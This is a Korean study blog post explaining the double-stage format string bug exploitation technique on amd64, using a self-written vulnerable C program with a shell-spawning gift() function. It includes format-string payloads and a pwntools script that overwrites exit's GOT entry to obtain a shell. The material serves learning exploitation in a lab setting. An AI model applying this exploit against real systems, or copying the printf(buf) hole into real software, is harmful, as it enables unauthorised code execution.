---
title: "[PWNABLE] DSFSB"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Double State Format String Bug버퍼가 전역 변수로 선언되어 있는 등의 상황에서 사용하는 fsb 기법이다. //gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c#include "
date: "2024-06-24"
translation_key: "tistory-d0f6d31273dc"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-dsfsb"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※**** 

#### **Double State Format String Bug**

버퍼가 전역 변수로 선언되어 있는 등의 상황에서 사용하는 fsb 기법이다.

```
//gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
#include <stdio.h>
#include <stdlib.h>

char buf[128];

void gift() {
    printf("Hello! ZZoMblE");
    system("/bin/sh");
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}
void vuln() {
    char str[128] = "Hello! whrd\n";
    printf("%s",str);
    puts("input 1 : ");
    read(0,buf,128);
    printf(buf);

    puts("input 2 : ");
    read(0,buf,128);
    printf(buf);

    exit(0);
}
int main() {
    initialize();
    vuln();
    return 0;
}
```

바로 위 예제를 가지고 살펴보겠다.

vuln()에서 fsb 취약점이 2개가 터지는 것을 확인할 수 있다.

이전의 fsb와는 다르게 read()를 통해 입력받는 버퍼가 지역 변수가 아닌 전역 변수이기 때문에 아래의 방식을 사용할 수가 없다.

```
%1234c%20$n0x401010
```

이런 경우 메모리가 다시 메모리를 가리키는 부분을 활용해야 한다.

이게 무슨 말인지 이해를 돕기 위해 아래 예제를 살펴보겠다.

![](/assets/images/tistory/tistory-d0f6d31273dc/001.png)

메모리가 메모리를 가리킨다라고 표현반 부분은 위 그림을 기준으로 vuln()의 sfp같은 부분을 의미한다.

vuln()의 sfp는 main()의 sfp를 가리키고 있다. 꼭 sfp가 아니어도 메모리가 쓰기 가능한 다른 메모리 영역을 가리키고 있으면 활용이 가능하다.

그럼 어떤 방법으로 해야할까??

크게 2가지 과정을 거쳐야 한다. 먼저 main()의 sfp에 exit()의 GOT 주소를 넣어준다. 이후 해당 offset을 계산하여 gift()로 덮어주면 dsfsb를 통한 GOT Overwrite를 수행할 수 있다.

```
from pwn import *

target = b'./ex'

p = process(target)
e = ELF(target)

gift = e.sym['gift']
exit_got = e.got['exit']

payload = '%{}c'.format(exit_got)
payload += '%22$n'

p.sendafter(b':', payload)

payload = '%{}c'.format(gift)
payload += '%24$n'
p.sendafter(b':', payload)

p.interactive()
```

페이로드는 위와 같이 매우 단순하다.

첫 번째 payload를 보내고 나면 main()의 sfp가 아래와 같이 변경되어 있는 것을 확인할 수 있다.

![](/assets/images/tistory/tistory-d0f6d31273dc/002.png)

두번째 payload를 보내고 나면 아래와 같이 exit()의 GOT 값이 변조된 것을 확인할 수 있다.

![](/assets/images/tistory/tistory-d0f6d31273dc/003.png)

최종적으로 아래와 같이 gift()가 실행되어 셸을 얻을 수 있다.

![](/assets/images/tistory/tistory-d0f6d31273dc/004.png)
